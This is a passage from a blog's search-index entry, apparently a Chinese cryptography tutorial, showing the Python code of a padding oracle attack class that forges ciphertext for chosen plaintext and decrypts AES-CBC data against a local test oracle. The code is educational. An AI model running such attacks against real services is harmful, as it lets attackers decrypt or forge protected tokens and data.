class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Error not find pad!"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(mid_lst)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__pad</span>(<span class="params">cls, text: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="string">"""PKCS7 padding"""</span></span><br><span class="line">        text_length = <span class="built_in">len</span>(text)</span><br><span class="line">        amount_to_pad = AES.block_size - (text_length % AES.block_size)</span><br><span class="line">        <span class="keyword">if</span> amount_to_pad == <span class="number">0</span>:</span><br><span class="line">            amount_to_pad = AES.block_size</span><br><span class="line">        pad = <span class="built_in">chr</span>(amount_to_pad).encode()</span><br><span class="line">        <span class="keyword">return</span> text + pad * amount_to_pad</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fake</span>(<span class="params">self, plain, cipher=<span class="literal">None</span>, mid=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">'''伪造</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :plain: 要伪造的明文</span></span><br><span class="line"><span class="string">        :last_cipher: 一个密文块</span></span><br><span class="line"><span class="string">        :last_mid:  密文块解密出来的中间值</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        pad_plain = <span class="variable language_">self</span>.__pad(plain)</span><br><span class="line">        plain_lst = <span class="variable language_">self</span>.split_block(pad_plain)</span><br><span class="line">        mid = mid <span class="keyword">if</span> mid <span class="keyword">else</span> <span class="variable language_">self</span>.mid_lst[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        cipher = [cipher <span class="keyword">if</span> cipher <span class="keyword">else</span> <span class="variable language_">self</span>.cipher_lst[-<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从最后开始计算</span></span><br><span class="line">        <span class="keyword">for</span> plain <span class="keyword">in</span> plain_lst[::-<span class="number">1</span>]:</span><br><span class="line">            need_iv = <span class="string">b""</span></span><br><span class="line">            <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">                _m = mid[idx]</span><br><span class="line">                _p = plain[idx]</span><br><span class="line">                need_iv += (_m ^ _p).to_bytes(<span class="number">1</span>, byteorder=<span class="string">"big"</span>)</span><br><span class="line"></span><br><span class="line">            mid = <span class="variable language_">self</span>.brute_middle(need_iv)</span><br><span class="line">            cipher.insert(<span class="number">0</span>, need_iv)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cipher[<span class="number">0</span>], <span class="string">b''</span>.join(cipher[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">'''解密'''</span></span><br><span class="line">        <span class="comment"># 从最后开始计算</span></span><br><span class="line">        <span class="variable language_">self</span>.mid_lst = []</span><br><span class="line">        <span class="keyword">for</span> _idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="variable language_">self</span>.cipher_lst), <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            line_idx = _idx - <span class="number">1</span></span><br><span class="line">            cipher_line = <span class="variable language_">self</span>.cipher_lst[line_idx]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> line_idx &gt;= <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># 获取上一行密文数据，因为每一行的明文加密之前需要与上一行的密文异或</span></span><br><span class="line">                p_cipher_line = <span class="variable language_">self</span>.cipher_lst[line_idx - <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 如果是第一行，则其与IV异或</span></span><br><span class="line">                p_cipher_line = iv</span><br><span class="line"></span><br><span class="line">            _mid = <span class="variable language_">self</span>.brute_middle(cipher_line)</span><br><span class="line">            <span class="variable language_">self</span>.mid_lst.insert(<span class="number">0</span>, _mid)</span><br><span class="line">            <span class="keyword">for</span> idx, _m <span class="keyword">in</span> <span class="built_in">enumerate</span>(_mid):</span><br><span class="line">                plain_chr = _m ^ p_cipher_line[idx]</span><br><span class="line">                <span class="variable language_">self</span>.plain_lst[line_idx].append(plain_chr)</span><br><span class="line"></span><br><span class="line">        plain = <span class="string">b""</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="variable language_">self</span>.plain_lst:</span><br><span class="line">            plain += <span class="built_in">bytes</span>(p)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    cipher = test()     <span class="comment"># 获取密文</span></span><br><span class="line">    iv = POA.IV         <span class="comment"># 获取初始化向量</span></span><br><span class="line"></span><br><span class="line">    poa_atck = PaddingOracleAttack(cipher, iv)</span><br><span class="line">    new_iv, new_cipher = poa_atck.fake(<span class="string">b"wo ai beijing tianan men!"</span>)</span><br><span class="line">    plain = poa_atck.decrypt()</span><br><span class="line"></span><br><span class="line">    IPython.embed()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码学算法安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> padding oracle攻击 </tag>
            
            <tag> web安全中的密码学攻击 </tag>
            
            <tag> 密码学算法安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
